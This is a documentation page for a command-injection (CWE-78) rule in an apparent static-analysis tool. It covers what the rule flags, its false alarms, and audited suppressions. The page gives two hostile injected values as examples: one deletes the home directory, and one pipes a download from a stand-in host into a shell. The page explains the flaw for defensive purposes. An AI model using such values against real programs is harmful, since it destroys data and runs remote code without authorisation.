# CommandInjection (`command-injection`)

**CWE:** [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · **Severity:** critical · **Default run:** reported

A command line made from text that comes from outside.

## What it reports

system(), popen() or exec*("sh", "-c", ...) was given a string built from getenv(), argv or data read from a file or socket. A value such as `x; rm -rf ~` or `$(curl evil|sh)` then runs with the program's rights. Pass the arguments to execv() without a shell, or check them against a fixed list.

## When it is a false alarm

A rule matches a shape of code, not a proof. This one is wrong when the
program establishes the condition the rule cannot see: a check on another
path, a wrapper that guarantees the invariant, or a value that is fixed by
the time the code runs. Every finding from a rule that exceeded the 2%
false-alarm budget is listed in `eval/PRECISION.md`.

## Silencing one

Add a rule to the suppression file, with a reason and an expiry date:

```
%s:<glob of the function or file> reason="why this is safe" expires=YYYY-MM-DD
```

`leakcheck --audit-suppressions -s <file>` lists every silence and fails
once one has expired, so a suppression is reviewed rather than forgotten.
